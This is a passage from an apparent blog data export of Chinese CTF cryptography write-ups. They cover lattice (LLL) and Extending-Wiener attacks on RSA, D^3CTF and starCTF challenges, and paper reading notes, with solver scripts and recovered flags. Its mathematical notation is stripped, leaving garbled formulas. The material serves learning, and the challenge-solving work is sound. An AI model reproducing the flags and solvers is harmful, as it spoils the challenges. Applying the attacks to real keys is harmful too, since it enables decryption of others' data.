57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611e2 = 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003half_n = round(sqrt(n))L = Matrix([[half_n ,e1 ,e2], [0 ,n1 ,0], [0 ,0 ,n2]])res = L.LLL()[0]assert abs(res[0]) % half_n == 0d = abs(res[0]) // half_nif isPrime(d) : knophi = e1 *d - 1 nophi = knophi // (knophi // n1 ) pq = nophi - n - 1 phi = n -pq +1 d1 = inverse_mod(e1,phi) print(l2b(pow(cs[0],d1,n1)))# b'vnctf{7d47956b-bc55-4897-a550-cda0b221ce67}' 后记这题做完感觉收获还是有的, 不像前面的几题 Lattice是一个神奇的东西, 一定要把所有方程写出来, 该联立的联立, 根据未知量和已知量以及这些数的位数,造出合适的Lattice才能求出出题人想要我们规约出的那个最短向量来","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"2020纵横杯 comon-Extending Wiener attack","date":"2021-03-12T11:33:50.000Z","path":"2021/03/12/2020纵横杯-comon-Extending-Wiener-attack/","text":"problem1234567891011121314151617from Crypto.Util.number import *e1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563N = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"f1 = bytes_to_long(flag[:21])f2 = bytes_to_long(flag[21:])c1 = pow(f1, e1, N)c2 = pow(f2, e2, N)print(\"e1 = \", e1)print(\"e2 = \", e2)print(\"N = \", N)print(\"c1 = \", c1)print(\"c2 = \", c2) 分析这个题一看还以为是简单的Common Attack, 只有同一个明文, 不同的才能用Common Attack 这里显然两个密文对应的不是同一个明文…这种题估计都有什么攻击方法, 后来找wp看了, 果然是有一种攻击方法的, 把paper(Extending Wiener’s Attack in the Presence of Many Decrypting Exponents)详细的学了一遍, 才明白具体该怎么解, 这个攻击方法适用于特别大, 并且有多个的时候(显然还有大到可以直接winner)大概思路是造一个格子求出参数让问题转变成winner要解决的问题(连分数的分解), 但是这里是为1的所以不需要连分数可以直接求出phi 构造格子的方法paper里有, 阅读笔记里也有这里就不多说, 直接造!这里LLL()规约出基后求phi即可 exp123456789101112131415161718192021222324252627282930from Crypto.Util.number import long_to_bytese1 = 28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581e2 = 131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563N = 159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253c1 = 89410578059910615243542114610890994179298819076294899300341196922537672226283347286177838507350481980653301675042566354947161446918391494634173771489921535378415952543761341962187827617956463740415683816828323475428328607025791449389552492799278886876413138326117622825124519567340298133646090783889193450681c2 = 106022564245731443282859231814772725680579944691962958987527668508496192529331599682371642691880849071915084510118117099828154554231286326729922119326305261125960484865171940233343041874124811917291652357776045940511178855947892557181650249473057939642726565131933445072147505756108121271288834439942107732015for epsilon in range(100): M1 = int(N^(0.5)) M2 = int(N^(1+5/14 - (epsilon*0.01))) #epsilon是没办法确定的, 小小的爆破一下 v1 = vector([N,-M1*N,0,N^2]) v2 = vector([0,M1*e1,-M2*e1,-e1*N]) v3 = vector([0,0,M2*e2,-e2*N]) v4 = vector([0,0,0,e1*e2]) L = Matrix([v1,v2,v3,v4]) B = L.LLL()[0] B = L.solve_left(B) phi = floor(e1 * B[1]//B[0]) # 这边phi会前后差1或者差2 for j in range(-2,3): try: d1 = inverse_mod(e1,phi+j) d2 = inverse_mod(e2,phi+j) flag = long_to_bytes(pow(c1,d1,N)) + long_to_bytes(pow(c2,d2,N)) if b'{' in flag and b'}' in flag: print(i,flag) except: pass 后记看完了理论自己代码实现的时候还是会有不少问题的.. 这里有一个Matrix.solve_left和Matrix.solve_right的区别, 也没怎么搞懂, 主要是不知道这两个到底什么时候用什么, 只能先每次都试试这两个了.","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Extending Wiener Attack","slug":"Extending-Wiener-Attack","permalink":"http://tearsjin.github.io/tags/Extending-Wiener-Attack/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"}]},{"title":"Reading notes Extending Wiener's Attack in the Presence of Many Decrypting Exponents","date":"2021-03-12T04:54:13.000Z","path":"2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/","text":"introductionthe purpose of this paper is given only several public exponents for a given modulus and the know-ledge of the corresponding private being quiet small. Low Private Exponent Attacks on RSAWiener’s ApproachThe Wiener’s Attack in this paper not the same as I had learnt before. Let then we have Dividing both side of equation (1) by Because and , we have , hence Then we need to quote an important conclusion: ifthen is a continued fraction approximant of so ifthen will be a continued fraction approximant of Condition can convert to gmand g will be small under the assumption that (but since p,q is odd)when we get , we can factor N so that break the RSA cryptosystem. Guo’s ApproachThis approach assumes that one has more than one for a given N, and each of these has a relatively small . For 2 encryption exponents, we have following relations:Multiplying the first by and the second by , and Subtraction of two formulas givesDividing both sides of equation 3 by and assuming that the are at most , so the right-hand side is about if we want the fraction could be a continued fraction approximant of , we must haveand with the assumption that and are at most and the g is small this condition will be true where with But known the and can not break the RSA cryptosystem for two reason.The solution is omitted here …. Overview of our Extension ApproachThis approach also assumes that we have more than one and each of these has a relatively small and the bounds of is: The can as large as whereFor some reason , the attack is only practical for small (the number of , not the modulus ). An Extension in the Presence of Many Small Decryption ExponentsPreliminariesLet us refer to the relations of the formwe shall also assume, for a given , that the and are at most , the is very small, the is about RSA in the presence of 2 Small Decryption ExponentsIf we have two small decryption exponents,then the following relations hold: or more explicitly: (这部分英文没看懂, 把原句抄下来了)Multiplying the first by , we may write these equations in the matrix form below.The sizes of the entries of the vectors on the right-hand side are at most respectively Multiplying the first three columns of the matrix by respectively, which gives following matrix:In this case the vector will be such thatif the Lattice is pretty “random” , there are almost no lattice points of shorter than the Minkowski bounds . Under this assumptions, then is the shortest point in , if for some small , which is true if So, if, the vector can be found via Lattice basis reduction algorithms(e.g. LLL), so that we can calculate . Then we can factor N via wiener’s approach. RSA in the presence of 3 Small Decryption ExponentsJust like the last section(RSA in the presence of 2 Small Decryption Exponents), the Lattice is:where is: RSA in the presence of 4 Small Decryption ExponentsThe matrix is too big…..","tags":[{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Reading","slug":"Reading","permalink":"http://tearsjin.github.io/tags/Reading/"}]},{"title":"writeup for 2021AntCTFxD^3CTF Crypto","date":"2021-03-08T11:08:34.000Z","path":"2021/03/08/writeup-for-2021AntCTFxD-3CTF/","text":"啊这次的这个比赛因为不会Lattice, 导致基本不会做啊, 虽然比赛后半段去学了也试着做了, 虽然格子造出来还被自己蠢到了, 但还是…收获很多hh 记录一下吧 babylattice当时做题的时候完全没有看到明文就是一个数字, 并不能转换成有语义的字符串….导致格子都造出来了还一直卡着但也体会到了一些造格子的方法, 以及格约出向量后需要注意的地方 problem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from collections import namedtuplePublicKey = namedtuple('PublicKey', ['n', 'b'])SecretKey = namedtuple('SecretKey', ['p', 'q', 'A'])def gen_key(): p = random_prime(2^512, lbound=2^511) q = random_prime(2^512, lbound=2^511) n = p * q a11, a12, a21 = [random_prime(2^100) for _ in range(3)] a22 = random_prime(2^100) while a11 * a22 == a12 * a21: a22 = random_prime(2^100) A = Matrix(ZZ, [[a11, a12], [a21, a22]]) a1 = crt([a11, a21], [p, q]) a2 = crt([a12, a22], [p, q]) b = a1 * inverse_mod(a2, n) % n PK = PublicKey(n, b) SK = SecretKey(p, q, A) return (PK, SK)def encrypt(m, pk): assert 0 &lt; m &lt; 2^400 r = randint(0, 2^400-1) c = (pk.b*m + r) % pk.n return cdef decrypt(c, sk): a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q]) s1 = a2 * c % sk.p s2 = a2 * c % sk.q m, r = sk.A.solve_right(vector([s1, s2])) return mdef test(pk, sk, num=3): for _ in range(num): m = randint(0, 2^400-1) c = encrypt(m, pk) mm = decrypt(c, sk) assert m == mmif __name__ == '__main__': from hashlib import sha256 from secret import m, FLAG assert FLAG == 'd3ctf{%s}' % sha256(int(m).to_bytes(50, 'big')).hexdigest() PK, SK = gen_key() test(PK, SK) c = encrypt(m, PK) print(f\"PK = {PK}\") print(f\"c = {c}\")\"\"\"PK = PublicKey(n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361, b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196)c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570\"\"\" 出现的参数 : 明文, : 密文, 其中 四个都是100-Bit : 512-Bit prime 分析由可以得到 移项有 考虑到都是未知的, 而且都是400位以下, 尝试构造格子将规约出来 这里的式子左边有三个项, 所以构造一个3维的格子 因为是三维的格子, 所以最短向量的大小大概是 而, 所以需要将格子的放大一点那么会有即,存在一个格点, 用LLL规约即可 1234567891011n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570v1 = vector(ZZ, [2^200, 0,c])v2 = vector(ZZ, [0, 1,-b])v3 = vector(ZZ, [0, 0,-n])Lattice = matrix([v1,v2,v3])m = abs(Lattice.LLL()[0][1])from hashlib import sha256print( 'd3ctf{%s}' % sha256(m).hexdigest()) 注意到实际格约出来的向量是全负的, 因为也在格子里面, 所以记得加个abs() 预期解这次的题第一题如果不是做的预期解那么第二题就会特别的难, 所以也顺便学习了一下预期解的做法(出题人预期了非预期解 如果不从入手的话, 就先看看前面几个参数的关系上面这三个式子, 可以得到这么一个方程组做到这里的时候, 有想过把方程组的两个式子相乘, 得到的会是但是这里已知的量只有, 也就是说在这个式子里, 有三项一个已知的都没有, 这样是没办法造格子的, 到这里就卡住了, 不得不翻看wp, 才发现, 原来可以把移到左边再相乘, 这样就只有一个项是未知的了!记再移一下项然后就是喜闻乐见的造格子可以看到右侧的向量长度很短, 可以规约出来 1(1173142580751247504024100371706709782500216511824162516724129,1382843159437215516163973075066558157591473749635266665605630,-211380743487233628797755584958526337321408979158793229985661) 因为四个都是100位的素数, 直接用http://www.factordb.com分解因为, 猜一下上面四个数哪两个是就可以得到了, 得到就可以分解, 直接得到所有的参数, 跑解密算法就可以得到明文了 simpleGroup这题比赛的时候也没做出来(第一题都做不出怎么做这题), 比完赛做了第一题才做这题啊啊啊但是因为太久没做次幂的运算导致做了好久……. problem12345678910111213141516171819202122from random import randintfrom secret import FLAG# A gift for key recovery in challenge [babyLattice]n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487M = int.from_bytes(FLAG, 'big')C = []while M != 0: m = M % e M //= e r = randint(0, n-1) c = power_mod(y, m, n) * power_mod(r, e, n) C.append(c % n)print(f\"C = {C}\")\"\"\"C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428]\"\"\" 分析 用的还是第一题的, 所以第一题分解出来的这题就有用了 加密的式子大概是 ,都是已知的, 而且 因为是不知道的, 肯定要想办法消去 , (有的师傅不消去也可以做, 待会下面补充一下) 这里的比较特殊, 这意味着我们可以直接计算一个, 使得, 欧拉定理yyds 加密的式子两边来个次幂, 就会有做到这里想把消去再用bsgs求离散对数, 但因为没有逆元卡了好久, 真的蠢… 这里是已知的, 直接看成, 用bsgs就完事了(用bsgs是因为m的范围是已知的) exp123456789101112131415161718192021222324252627282930from random import randintn=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487C = [...]a11 = 207806651167586080788016046729a12 = 1151291153120610849180830073509p = gcd(b * a12 - a11,n)q = n // pphi = (p-1) * (q-1)M = []assert gcd(e,phi) == ed = phi // eassert pow(pow(randint(0,n-1),e,n),d,n) == 1bounds = ( 1,e )F = IntegerModRing(n)for i in C: cd = pow(i,d,n) yd = pow(y,d,n) M.append(bsgs(F(yd),F(cd),bounds))flag = 0for i in M[::-1]: flag = int(flag) * int(e) + int(i)from Crypto.Util.number import long_to_bytesprint(long_to_bytes(flag)) 不用消去的解https://www.anquanke.com/post/id/233827#h2-4, 这位师傅做的 一样先看一下加密的式子 这题有一个特殊的点就是可以被分解为和两个素数，这两个素数又分别是和的因子 所以会有因为是一个比较小的数, 可以通过遍历, 再判断是否是的次剩余, 就可以得到 同理我们也可以得到 再通过中国剩余定理就能得到了 这里有个素数模的次剩余的判断方法, 很简单, 为模的次剩余的充要条件为 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import *import gmpy2p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487e1 = 36493e2 = 52859def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) K = c // d * gmpy2.invert(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return (cura % curm, curm) def check(d,p,n): if((p - 1) % n == 0): return pow(d,(p - 1) // n,p) == 1 else: k = gmpy2.gcd(n, p - 1) return pow(d,(p - 1) // k,p) == 1def getM(c,e,p): for i in range(2,e): tmpc = (c * gmpy2.invert(pow(y,i,p),p)) % p if check(tmpc,p,e): return i exit(0)C = [...]m = 0for c in C[::-1]: cp = c % p cq = c % q m1 = getM(cp,e1,p) m2 = getM(cq,e2,q) mm,lcm = GCRT([e1,e2],[m1,m2]) print(\"Get mm: \" + hex(mm)) m *= e m += mmflag = long_to_bytes(m)print(flag) 后记这题一点都不难, 做了那么久完全就是脑子没转过来… 耗子尾汁, 好好反思 AliceWantFlag studying~ EasyCurve studying~","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup for 2020 starCTF Crypto","date":"2021-01-18T01:28:15.000Z","path":"2021/01/18/writeup-for-2020-starCTF/","text":"总之就是吃老本总之就是曲线好难这次就差一道MyCurve…找个师傅学习学习再补充这个 Crypto MyEnc GuessKey2 little case MyCurve MyEncnc 52.163.228.53 8081附件:12345678910111213141516171819202122232425from Crypto.Util.number import getPrime,bytes_to_longimport time,urandomfrom flag import flagiv=bytes_to_long(urandom(256))assert len(flag)==15keystream=bin(int(flag.encode(&#x27;hex&#x27;),16))[2:].rjust(8*len(flag),&#x27;0&#x27;)p=getPrime(1024)q=getPrime(1024)n=p*qprint &quot;n:&quot;,ncnt=0while True: try: print &#x27;give me a number:&#x27; m=int(raw_input()) except: break ct=iv for i in range(1,8): if keystream[cnt]==&#x27;1&#x27;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print &quot;done:&quot;,ctstream cipher的味道flag 即 keystream 共120位每次输入一个m , 根据key的7位返回一个ct第1个m对应key的0~6第2个m对应key的7~13…第17个m对应key的112~118第18个m对应key的119~5…120个m则会回到刚开始一样 而重复传同样的m的时候, 如果取key的7位是相同的, 那么返回的ct也是相同的, 根据这个特点, 重复传120个m=0, 可以得到一些返回相同ct的7位, 也就是key里面相同的两个7位 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from hashlib import sha256import reprintable = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;con = remote(&#x27;52.163.228.53&#x27;, 8081)def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start + END).encode()).hexdigest() if ensha == SHA: print(start) return start.encode()resp = con.recvuntil(&#x27;xxxx:&#x27;).decode()END = re.findall(r&#x27;xxxx\\+(.*)\\) ==&#x27;, resp)[0]SHA = re.findall(r&#x27;== (.*)&#x27;, resp)[0]print(resp)resp = con.recv().decode()print(resp)con.sendline(proof(END, SHA))resp = con.recvuntil(&#x27;number:&#x27;).decode()print(resp)arr = []for _ in range(120): con.sendline(&#x27;0&#x27;.encode()) resp = con.recvuntil(&#x27;number:&#x27;).decode() num = int(resp[6:-17]) if num not in arr: arr.append(num) else: arr.append(-1) print(_, arr.index(num)) 得到的输出为:12345678910111213141516171819202122232425262728293031323334353615 1226 1432 137 943 3152 5154 1460 4869 5871 3176 3977 6580 881 3882 4885 6386 3188 4890 792 1793 5694 296 6498 7099 0100 12103 48104 12105 65106 49110 73112 72114 78115 87117 29118 83第一行的15 12代表着, key的15 7~15 7+6 == 12 7~12 7+6也就是key[105:112] == key[84:91]每一行都能构造出这么一个等式 根据所有等式, 可以将后面的一些位数用前面的位数表示(他们都是相等的)12345678910111213141516arr = [15, 12, 26, 14, 32, 1, 37, 9, 43, 31, 52, 51, 54, 14, 60, 48, 69, 58, 71, 31, 76, 39, 77, 65, 80, 8, 81, 38, 82, 48, 85, 63, 86, 31, 88, 48, 90, 7, 92, 17, 93, 56, 94, 2, 96, 64, 98, 70, 99, 0, 100, 12, 103, 48, 104, 12, 105, 65, 106, 49, 110, 73, 112, 72, 114, 78, 115, 87, 117, 29, 118, 83]key = [i for i in range(120)]for _ in range(1000): for i in range(0, len(arr), 2): for (j, k) in zip(range((arr[i + 1] * 7), (arr[i + 1] * 7 + 7)), range((arr[i] * 7), (arr[i] * 7 + 7))): if key[j % 120] &lt; key[k % 120]: key[k % 120] = key[j % 120] else: key[j % 120] = key[k % 120]print(key)然后! 就能把key还原成:1[0, 0, 2, 0, 2, 0, 2, 0, 0, 2, 0, 0, 0, 0, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 0, 0, 0, 2, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 40, 41, 42, 43, 2, 0, 0, 2, 0, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 2, 2, 0, 0, 2, 2, 0, 0, 0, 0, 0, 2, 2, 2, 0, 2, 0, 0, 0, 0, 2, 2, 0, 0, 0, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 0, 2, 0, 0, 0, 0, 2, 0, 113, 114, 2, 2, 2, 0, 2]0和2分别代表着1或者0(不确定是0对应1还是2对应1而其他的比较大的数则是未知的, 一共12位,所以只需要爆破2^12次, 然后再猜一下0对应的是1还是0这里直接猜0对应0, 中啦!1234567891011121314151617for i in range(len(key)): if key[i] == 0: key[i] = &#x27;0&#x27; elif key[i] == 2: key[i] = &#x27;1&#x27; else: key[i] = &#x27;&#123;&#125;&#x27;key = &#x27;&#x27;.join(key)from MyCrypto.Conversion import bin2textfor i in range(2 ** 12): pad = bin(i)[2:].zfill(12) keystream = key.format(pad[0], pad[1], pad[2], pad[3], pad[4], pad[5], pad[6], pad[7], pad[8], pad[9], pad[10], pad[11]) flag = bin2text(keystream) if flag[0] == &#x27;*&#x27; and flag[-1] == &#x27;&#125;&#x27; and &#x27;&#123;&#x27; in flag: print(flag)得到的输出:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128*CTF&#123; HuG0t1T!&#125;*CTF&#123; IuG0t1T!&#125;*CTF&#123; JuG0t1T!&#125;*CTF&#123; KuG0t1T!&#125;*CTF&#123; LuG0t1T!&#125;*CTF&#123; MuG0t1T!&#125;*CTF&#123; NuG0t1T!&#125;*CTF&#123; OuG0t1T!&#125;*CTF&#123;\u0019HuG0t1T!&#125;*CTF&#123;\u0019IuG0t1T!&#125;*CTF&#123;\u0019JuG0t1T!&#125;*CTF&#123;\u0019KuG0t1T!&#125;*CTF&#123;\u0019LuG0t1T!&#125;*CTF&#123;\u0019MuG0t1T!&#125;*CTF&#123;\u0019NuG0t1T!&#125;*CTF&#123;\u0019OuG0t1T!&#125;*CTF&#123;)HuG0t1T!&#125;*CTF&#123;)IuG0t1T!&#125;*CTF&#123;)JuG0t1T!&#125;*CTF&#123;)KuG0t1T!&#125;*CTF&#123;)LuG0t1T!&#125;*CTF&#123;)MuG0t1T!&#125;*CTF&#123;)NuG0t1T!&#125;*CTF&#123;)OuG0t1T!&#125;*CTF&#123;9HuG0t1T!&#125;*CTF&#123;9IuG0t1T!&#125;*CTF&#123;9JuG0t1T!&#125;*CTF&#123;9KuG0t1T!&#125;*CTF&#123;9LuG0t1T!&#125;*CTF&#123;9MuG0t1T!&#125;*CTF&#123;9NuG0t1T!&#125;*CTF&#123;9OuG0t1T!&#125;*CTF&#123;IHuG0t1T!&#125;*CTF&#123;IIuG0t1T!&#125;*CTF&#123;IJuG0t1T!&#125;*CTF&#123;IKuG0t1T!&#125;*CTF&#123;ILuG0t1T!&#125;*CTF&#123;IMuG0t1T!&#125;*CTF&#123;INuG0t1T!&#125;*CTF&#123;IOuG0t1T!&#125;*CTF&#123;YHuG0t1T!&#125;*CTF&#123;YIuG0t1T!&#125;*CTF&#123;YJuG0t1T!&#125;*CTF&#123;YKuG0t1T!&#125;*CTF&#123;YLuG0t1T!&#125;*CTF&#123;YMuG0t1T!&#125;*CTF&#123;YNuG0t1T!&#125;*CTF&#123;YOuG0t1T!&#125;*CTF&#123;iHuG0t1T!&#125;*CTF&#123;iIuG0t1T!&#125;*CTF&#123;iJuG0t1T!&#125;*CTF&#123;iKuG0t1T!&#125;*CTF&#123;iLuG0t1T!&#125;*CTF&#123;iMuG0t1T!&#125;*CTF&#123;iNuG0t1T!&#125;*CTF&#123;iOuG0t1T!&#125;*CTF&#123;yHuG0t1T!&#125;*CTF&#123;yIuG0t1T!&#125;*CTF&#123;yJuG0t1T!&#125;*CTF&#123;yKuG0t1T!&#125;*CTF&#123;yLuG0t1T!&#125;*CTF&#123;yMuG0t1T!&#125;*CTF&#123;yNuG0t1T!&#125;*CTF&#123;yOuG0t1T!&#125;*CTF&#123;HuG0t1T!&#125;*CTF&#123;IuG0t1T!&#125;*CTF&#123;JuG0t1T!&#125;*CTF&#123;KuG0t1T!&#125;*CTF&#123;LuG0t1T!&#125;*CTF&#123;MuG0t1T!&#125;*CTF&#123;NuG0t1T!&#125;*CTF&#123;OuG0t1T!&#125;*CTF&#123;HuG0t1T!&#125;*CTF&#123;IuG0t1T!&#125;*CTF&#123;JuG0t1T!&#125;*CTF&#123;KuG0t1T!&#125;*CTF&#123;LuG0t1T!&#125;*CTF&#123;MuG0t1T!&#125;*CTF&#123;NuG0t1T!&#125;*CTF&#123;OuG0t1T!&#125;*CTF&#123;©HuG0t1T!&#125;*CTF&#123;©IuG0t1T!&#125;*CTF&#123;©JuG0t1T!&#125;*CTF&#123;©KuG0t1T!&#125;*CTF&#123;©LuG0t1T!&#125;*CTF&#123;©MuG0t1T!&#125;*CTF&#123;©NuG0t1T!&#125;*CTF&#123;©OuG0t1T!&#125;*CTF&#123;¹HuG0t1T!&#125;*CTF&#123;¹IuG0t1T!&#125;*CTF&#123;¹JuG0t1T!&#125;*CTF&#123;¹KuG0t1T!&#125;*CTF&#123;¹LuG0t1T!&#125;*CTF&#123;¹MuG0t1T!&#125;*CTF&#123;¹NuG0t1T!&#125;*CTF&#123;¹OuG0t1T!&#125;*CTF&#123;ÉHuG0t1T!&#125;*CTF&#123;ÉIuG0t1T!&#125;*CTF&#123;ÉJuG0t1T!&#125;*CTF&#123;ÉKuG0t1T!&#125;*CTF&#123;ÉLuG0t1T!&#125;*CTF&#123;ÉMuG0t1T!&#125;*CTF&#123;ÉNuG0t1T!&#125;*CTF&#123;ÉOuG0t1T!&#125;*CTF&#123;ÙHuG0t1T!&#125;*CTF&#123;ÙIuG0t1T!&#125;*CTF&#123;ÙJuG0t1T!&#125;*CTF&#123;ÙKuG0t1T!&#125;*CTF&#123;ÙLuG0t1T!&#125